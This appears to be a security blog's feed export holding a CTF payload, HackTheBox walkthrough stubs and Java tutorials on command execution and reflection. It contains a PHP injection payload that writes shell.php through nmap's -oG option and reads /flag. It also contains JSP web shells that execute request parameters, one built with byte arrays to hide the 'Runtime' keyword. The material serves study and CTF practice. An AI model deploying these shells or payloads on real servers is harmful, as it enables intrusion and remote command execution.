<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?host&#x3D;&#39; &lt;?php phpinfo();?&gt; -oG shell.php &#39;</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200617114825.png" alt=""></p>
<p>读取flag：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?host&#x3D;&#39; &lt;?php echo &#96;cat &#x2F;flag&#96;;?&gt; -oG mmm.php &#39;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>代码审计</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title>HackTheBox-Academy-Walkthrough</title>
    <url>/Target_drone/HackTheBox/22.HackTheBox-Academy-Walkthrough/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="fff9a5e0d9ca6fa774a982315d2eba5262fc3915dd4196909cc507a2504a369f"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-xray">
      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">Hey, password is required here.</span>
      </label>
      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">
        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>
        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>
      </svg>
    </div>
  </div>
</div>
<script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>靶机</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HackTheBox-Delivery-Walkthrough</title>
    <url>/Target_drone/HackTheBox/23.HackTheBox-Delivery-Walkthrough/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="c7a4e24ecb3297b4f4dff3f2cb1d8367222253fc649d328db0af4fc40f517521"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-xray">
      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">Hey, password is required here.</span>
      </label>
      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">
        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>
        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>
      </svg>
    </div>
  </div>
</div>
<script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>靶机</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>HackTheBox-Passage-Walkthrough</title>
    <url>/Target_drone/HackTheBox/24.HackTheBox-Passage-Walkthrough/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="6846db320cd128fad25d9ca1fc4c5d5ff88472c9760663f893219206ae954ae8"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-xray">
      <input class="hbe hbe-input-field hbe-input-field-xray" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-xray" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-xray">Hey, password is required here.</span>
      </label>
      <svg class="hbe hbe-graphic hbe-graphic-xray" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">
        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>
        <path d="M0,2.5c0,0,298.666,0,399.333,0C448.336,2.5,513.994,13,597,13c77.327,0,135-10.5,200.999-10.5c95.996,0,402.001,0,402.001,0"></path>
      </svg>
    </div>
  </div>
</div>
<script src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>靶机</category>
        <category>HTB</category>
      </categories>
      <tags>
        <tag>靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>Java基础学习之本地命令执行</title>
    <url>/Java/code/6.Java%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0%E4%B9%8B%E6%9C%AC%E5%9C%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<h1 id="Java基础学习之本地命令执行">Java基础学习之本地命令执行</h1>
<p>首先总的的来说，java命令执行可以分为4种方法，分别是 java.lang.Runtime#exec()、java.lang.ProcessBuilder#start()、java.lang.ProcessImpl#start()以及通过JNI的方式调用动态链接库，最后一种方式这篇文章暂不做分析，先看下前面比较常用的三种方法。</p>
<h2 id="0x01-Runtime命令执行">0x01 Runtime命令执行</h2>
<p>在Java中最常见的就是使用<code>java.lang.Runtime</code>类的<code>exec</code>方法来执行本地系统命令。</p>
<p>runtime-exec.jsp执行cmd命令示例:</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%--</span><br><span class="line">  Created by IntelliJ IDEA.</span><br><span class="line">  User: ca01h</span><br><span class="line">  Date: <span class="number">2021</span>/<span class="number">3</span>/<span class="number">7</span></span><br><span class="line">  Time: <span class="number">22</span>:<span class="number">53</span></span><br><span class="line">  To change <span class="keyword">this</span> template use File | Settings | File Templates.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.ByteArrayOutputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    InputStream in = Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream();</span><br><span class="line"></span><br><span class="line">    ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">    <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">        baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    out.write(<span class="string">&quot;&lt;pre&gt;&quot;</span> + <span class="keyword">new</span> String(baos.toByteArray()) + <span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
<p>如果我们不希望在代码中出现和<code>Runtime</code>相关的关键字，我们可以全部用反射代替。</p>
<p>reflection-cmd.jsp示例代码：</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%--</span><br><span class="line">  Created by IntelliJ IDEA.</span><br><span class="line">  User: ca01h</span><br><span class="line">  Date: <span class="number">2021</span>/<span class="number">3</span>/<span class="number">8</span></span><br><span class="line">  Time: <span class="number">18</span>:<span class="number">19</span></span><br><span class="line">  To change <span class="keyword">this</span> template use File | Settings | File Templates.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Method&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    String str = request.getParameter(<span class="string">&quot;str&quot;</span>);</span><br><span class="line">    <span class="comment">// 定义&quot;java.lang.Runtime&quot;字符串变量</span></span><br><span class="line">    String rt = <span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">46</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">46</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span>&#125;);</span><br><span class="line">    <span class="comment">// 反射java.lang.Runtime类获取Class对象</span></span><br><span class="line">    Class&lt;?&gt; c = Class.forName(rt);</span><br><span class="line">    <span class="comment">// 反射获取Runtime类的getRuntime方法</span></span><br><span class="line">    Method m1 = c.getMethod(<span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">82</span>, <span class="number">117</span>, <span class="number">110</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">109</span>, <span class="number">101</span>&#125;));</span><br><span class="line">    <span class="comment">// 反射获取Runtime类的exec方法</span></span><br><span class="line">    Method m2 = c.getMethod(<span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">101</span>, <span class="number">120</span>, <span class="number">101</span>, <span class="number">99</span>&#125;), String.class);</span><br><span class="line">    <span class="comment">// 反射调用Runtime.getRuntime().exec(xxx)方法</span></span><br><span class="line">    Object obj1 = m2.invoke(m1.invoke(<span class="keyword">null</span>, <span class="keyword">new</span> Object[]&#123;&#125;), <span class="keyword">new</span> Object[]&#123;str&#125;);</span><br><span class="line">    <span class="comment">// 反射获取Process类的getInputStream方法</span></span><br><span class="line">    Method m = obj1.getClass().getMethod(<span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>&#125;));</span><br><span class="line">    m.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">// 获取命令执行结果的输入流对象：p.getInputStream()并使用Scanner按行切割成字符串</span></span><br><span class="line">    Scanner s = <span class="keyword">new</span> Scanner((InputStream) m.invoke(obj1, <span class="keyword">new</span> Object[]&#123;&#125;)).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">    String result = s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="comment">// 输出命令执行结果</span></span><br><span class="line">    out.println(result);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
<p><strong>Runtime命令执行调用链</strong></p>
<p><code>Runtime.exec(xxx)</code>调用链如下:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">copyjava.lang.UNIXProcess.&lt;init&gt;(UNIXProcess.java:<span class="number">247</span>)</span><br><span class="line">java.lang.ProcessImpl.start(ProcessImpl.java:<span class="number">134</span>)</span><br><span class="line">java.lang.ProcessBuilder.start(ProcessBuilder.java:<span class="number">1029</span>)</span><br><span class="line">java.lang.Runtime.exec(Runtime.java:<span class="number">620</span>)</span><br><span class="line">java.lang.Runtime.exec(Runtime.java:<span class="number">450</span>)</span><br><span class="line">java.lang.Runtime.exec(Runtime.java:<span class="number">347</span>)</span><br><span class="line">org.apache.jsp.runtime_002dexec2_jsp._jspService(runtime_002dexec2_jsp.java:<span class="number">118</span>)</span><br></pre></td></tr></table></figure>
<p>通过观察整个调用链我们可以清楚的看到<code>exec</code>方法并不是命令执行的最终点，执行逻辑大致是：</p>
<ol>
<li><code>Runtime.exec(xxx)</code></li>
<li><code>java.lang.ProcessBuilder.start()</code></li>
<li><code>new java.lang.UNIXProcess(xxx)</code></li>
<li><code>UNIXProcess</code>构造方法中调用了<code>forkAndExec(xxx)</code> native方法。</li>
<li><code>forkAndExec</code>调用操作系统级别<code>fork</code>-&gt;<code>exec</code>(*nix)/<code>CreateProcess</code>(Windows)执行命令并返回<code>fork</code>/<code>CreateProcess</code>的<code>PID</code>。</li>
</ol>
<h2 id="0x02-ProcessBuilder命令执行">0x02 ProcessBuilder命令执行</h2>
<p>process_builder.jsp命令执行测试</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%--</span><br><span class="line">  Created by IntelliJ IDEA.</span><br><span class="line">  User: ca01h</span><br><span class="line">  Date: <span class="number">2021</span>/<span class="number">3</span>/<span class="number">8</span></span><br><span class="line">  Time: <span class="number">18</span>:<span class="number">38</span></span><br><span class="line">  To change <span class="keyword">this</span> template use File | Settings | File Templates.</span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.ByteArrayOutputStream&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    InputStream in = <span class="keyword">new</span> ProcessBuilder(request.getParameterValues(<span class="string">&quot;cmd&quot;</span>)).start().getInputStream();</span><br><span class="line">    ByteArrayOutputStream baos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">    <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> ((a = in.read(b)) != -<span class="number">1</span>)&#123;</span><br><span class="line">        baos.write(b, <span class="number">0</span>, a);</span><br><span class="line">    &#125;</span><br><span class="line">    out.write(<span class="string">&quot;&lt;pre&gt;&quot;</span> + <span class="keyword">new</span> String(baos.toByteArray()) + <span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>start方法执行命令,启动一个进程,返回一个Process对象；</li>
<li>java.lang.Process.getInputStream() 方法获取子进程的输入流。</li>
</ul>
<p>Runtime和ProcessBuilder的区别：</p>
<p>同个字符串参数对于ProcessBuilder类和Runtime类的命令执行结果来说是不同的，举个例子，比如同样是执行命令<code>ping -c 1 www.baidu.com</code></p>
<p>传入Runtime类的exec方法后，之后会先把<code>ping -c 1 www.baidu.com</code>以空格隔开分为四部分，第一部分的<code>ping</code>会作为启动模块，其他部分作为第一部分的命令行参数，如下：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210309130457.png" alt=""></p>
<p>到了ProcessBuilder类这里，同样的命令传进来的话就抛出错误：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210309130738.png" alt=""></p>
<p>这是因为ProcessBuilder类把整个“ipconfig /all”都标记化了，在后面的调用中会把这整一串都当做启动模块的名字寻找。具体原因可以看下面两篇文章的调试过程：</p>
<p><a href="https://www.anquanke.com/post/id/221159">https://www.anquanke.com/post/id/221159</a></p>
<p><a href="http://www.lmxspace.com/2019/10/08/Java%E4%B8%8B%E5%A5%87%E6%80%AA%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">Java下奇怪的命令执行</a></p>
<h2 id="0x03-UNIXProcess-ProcessImpl反射执行命令">0x03 UNIXProcess/ProcessImpl反射执行命令</h2>
<p>Runtime命令执行中的调用链提到过<code>UNIXProcess</code>，<code>UNIXProcess</code>和<code>ProcessImpl</code>其实就是最终调用<code>native</code>执行系统命令的类，这个类提供了一个叫<code>forkAndExec</code>的native方法，如方法名所述主要是通过<code>fork&amp;exec</code>来执行本地系统命令。</p>
<p>ProcessImpl类需要值得注意的就是它没有共有构造方法，只有一个private类型的方法，所以是不能直接实例化ProcessImpl类的，虽然我们不能直接new一个ProcessImpl，但是可以利用反射去调用非public类的方法，如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cmd_exec;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">processImplDemo</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String[] cmds =  &#123;<span class="string">&quot;ping&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="string">&quot;www.baidu.com&quot;</span>&#125;;</span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;java.lang.ProcessImpl&quot;</span>);</span><br><span class="line">        Method method = clazz.getDeclaredMethod(<span class="string">&quot;start&quot;</span>, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, <span class="keyword">boolean</span>.class);</span><br><span class="line">        method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InputStream ins = ((Process)method.invoke(<span class="keyword">null</span>,cmds,<span class="keyword">null</span>,<span class="string">&quot;.&quot;</span>,<span class="keyword">null</span>,<span class="keyword">true</span>)).getInputStream();</span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">        <span class="keyword">int</span> size;</span><br><span class="line">        <span class="keyword">while</span>((size = ins.read(bytes)) &gt; <span class="number">0</span>)</span><br><span class="line">            bos.write(bytes,<span class="number">0</span>,size);</span><br><span class="line">        System.out.println(bos.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>编程</category>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>Java安全学习之反射</title>
    <url>/Java/javasec/1.Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E4%B9%8B%E5%8F%8D%E5%B0%84/</url>
    <content><![CDATA[<h1 id="Java安全学习之反射">Java安全学习之反射</h1>
<p>参考文章：</p>
<p><a href="https://xz.aliyun.com/t/9117">https://xz.aliyun.com/t/9117</a></p>
<p><a href="https://xz.aliyun.com/t/7029">https://xz.aliyun.com/t/7029</a></p>
<p>P神-java安全漫谈-反射机制1（知识星球-代码审计）<br>
P神-java安全漫谈-反射机制2（知识星球-代码审计）<br>
P神-java安全漫谈-反射机制3（知识星球-代码审计）</p>
<h2 id="0x01-反射概念">0x01 反射概念</h2>
<p>反射的核心是JVM在运行状态的时候才动态加载类，对于任意一个类都能够知道这个类所有的属性和方法，并且对于任意一个对象，都能够调用它的方法/访问属性。这种动态获取信息以及动态调用对象方法的功能成为Java语言的反射机制。通过使用反射我们不仅可以获取到任何类的成员方法(Methods)、成员变量(Fields)、构造方法(Constructors)等信息，还可以动态创建Java类实例、调用任意的类方法、修改任意的类成员变量值等。</p>
<blockquote>
<p>⼀段代码，改变其中的变量，将会导致 这段代码产⽣功能性的变化，称之为动态特性。</p>
</blockquote>
<h2 id="0x02-java反射机制流程图">0x02 java反射机制流程图</h2>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210309194221.png" alt=""></p>
<p>比如我们创建了一个类文件，经过javac编译之后，就会形成class文件，同时jvm内存会查找生成的class文件读入内存和经过ClassLoader加载，同时会自动创建生成一个Class对象，里面拥有其获取成员变量Field，成员方法Method和构造方法Constructor等方法。最后就是我们平时new创建对象。</p>
<p>反射机制本身就是获取一个类的Class对象，然后在用Class对象中的获取成员变量Field，成员方法Method和构造方法Constructor等方法，再去动态获取一个类或者调用一个类的属性，变量，构造方法等方式。</p>
<h2 id="0x03-反射常见使用方法">0x03 反射常见使用方法</h2>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">execute</span><span class="params">(String className, String methodName)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Class clazz = Class.forName(className);    </span><br><span class="line">    clazz.getMethod(methodName).invoke(clazz.newInstance()); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上⾯的例⼦中，演示了⼏个在反射⾥极为重要的⽅法：</p>
<ul>
<li>
<p>获取类的⽅法： forName</p>
</li>
<li>
<p>实例化类对象的⽅法： newInstance</p>
</li>
<li>
<p>获取函数的⽅法： getMethod</p>
</li>
<li>
<p>执⾏函数的⽅法： invoke</p>
</li>
</ul>
<p>基本上，这⼏个⽅法包揽了Java安全⾥各种和反射有关的Payload，首先来一个个的解释。</p>
<h3 id="forName">forName</h3>
<p>获取”类“(<strong>java.lang.Class</strong>)的对象有三种方法：</p>
<ul>
<li><strong>obj.getClass()</strong> 如果上下⽂中存在某个类的实例 obj ，那么我们可以直接通过obj.getClass() 来获取它的类；</li>
<li><strong>Test.class</strong> 如果你已经加载了某个类，只是想获取到它的 java.lang.Class 对象，那么就直接拿它的 class 属性即可。这个⽅法其实不属于反射。</li>
<li><strong>Class.forName</strong> 如果你知道某个类的名字，想获取到这个类，就可以使⽤ forName 来获取</li>
</ul>
<p>forName有两个函数重载：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; forName(String name)</span><br><span class="line"><span class="comment">//name:class名称</span></span><br><span class="line">Class&lt;?&gt; forName(String name, **<span class="keyword">boolean</span>** initialize, ClassLoader loader)</span><br><span class="line"><span class="comment">//name:class名称</span></span><br><span class="line"><span class="comment">//initialize：是否进行“类初始化”</span></span><br><span class="line"><span class="comment">//loader：加载器</span></span><br></pre></td></tr></table></figure>
<p>类初始化和类实例化的区别，先来看如下这个类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TrainPrint</span> </span>&#123;</span><br><span class="line">    <span class="comment">//初始块</span></span><br><span class="line">    &#123;        </span><br><span class="line">        System.out.printf(<span class="string">&quot;Empty block initial %s\n&quot;</span>, <span class="keyword">this</span>.getClass());    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//静态初始块</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">            System.out.printf(<span class="string">&quot;Static initial %s\n&quot;</span>, TrainPrint.class);    </span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//构造函数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">TrainPrint</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.printf(<span class="string">&quot;Initial %s\n&quot;</span>, <span class="keyword">this</span>.getClass());</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分别使用forName和实例化</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    Class.forName(<span class="string">&quot;TrainPrint&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Static initial class TrainPrint</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">   TrainPrint test= <span class="keyword">new</span> TrainPrint();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Static initial class TrainPrint</span></span><br><span class="line"><span class="comment">// Empty block initial class TrainPrint</span></span><br><span class="line"><span class="comment">// Initial class TrainPrint</span></span><br></pre></td></tr></table></figure>
<p>类的实例化：<code>静态初始块</code>-&gt;<code>初始块</code>-&gt;<code>构造函数</code><br>
类的初始化：<code>静态初始块</code></p>
<h3 id="getMethod">getMethod</h3>
<p>getMethod 的作用是通过反射获取一个类的某个特定的<strong>公有</strong>方法。<br>
而Java中支持类的重载，我们不能仅通过函数名来确定一个函数。所以，在调用 getMethod 的时候，我们需要传给他你需要获取的函数的参数类型列表，如下：<br>
<code>Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;, String.class)</code></p>
<h3 id="invoke">invoke</h3>
<p>invoke方法位于Method类下，其的作用是传入参数，执行方法，它的第一个参数是执行method的对象：</p>
<ul>
<li>如果这个方法是一个普通方法，那么第一个参数是类对象</li>
<li>如果这个方法是一个静态方法，那么第一个参数是类（之后会提到，这里其实不用那么死板，这个）<br>
它接下来的参数才是需要传入的参数。</li>
</ul>
<p>以反射执行<code>Runtime.getRuntime().exec(&quot;calc.exe&quot;);</code>为例：</p>
<p>最开始的想法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(clazz.newInstance(), <span class="string">&quot;id&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>但是会执行报错，意思大概是Runtime的类对象不能通过newInstance()来获取对象（class.newInstance等于new class）,是因为Runtime的类构造函数是一个private构造函数，只能通过getRuntime方法返回一个对象。</p>
<blockquote>
<p>之所以构造函数是private属性，是因为Runtime遵循单例模式，不允许多次实例化，类初始化的时候会执行一次构造函数，只能通过 Runtime.getRuntime() 来获取到Runtime对象。</p>
</blockquote>
<p>那么很自然的第二个想法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>); </span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(clazz), <span class="string">&quot;id&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>分开来写会更清楚：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">Method execMethod = clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">Method getRuntimeMethod = clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">Object runtime = getRuntimeMethod.invoke(clazz);</span><br><span class="line">exec = execMethod.invoke(runtime, <span class="string">&quot;id&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>以上我们就完成了通过类内置的静态方法获取类的实例，进一步调用一个public方法。<br>
但是假如一个类没有无参构造方法（即不能class.newInstance()），也没有单例模式（只存在一个实例）的静态方法（即不能像getRuntime一样获取实例），那我们该如何实例化这个类呢？</p>
<h3 id="指定的构造方法生成类的实例">指定的构造方法生成类的实例</h3>
<p>假如我们这次使用ProcessBuilder来执行本地命令：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; paramList = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">paramList.add(<span class="string">&quot;calc.exe&quot;</span>);</span><br><span class="line">ProcessBuilder pb = <span class="keyword">new</span> ProcessBuilder(paramList);</span><br><span class="line">pb.start();</span><br></pre></td></tr></table></figure>
<p>可见，其构造函数是写入了一个字符串，不是无参构造方法，接下来我们会一步步进行转化。</p>
<p><code>getConstructor()</code>函数可以选定指定接口格式的构造函数(由于构造函数也可以根据参数来进行重载)，即：<code>getConstructor(参数类型)</code></p>
<p>选定后我们可以通过newInstance(),并传入构造函数的参数执行构造函数，即<code>newInstance(传入的构造函数参数)</code>。</p>
<p>ProcessBuilder有两个构造函数：</p>
<ul>
<li><code>public ProcessBuilder(List&lt;String&gt; command)</code></li>
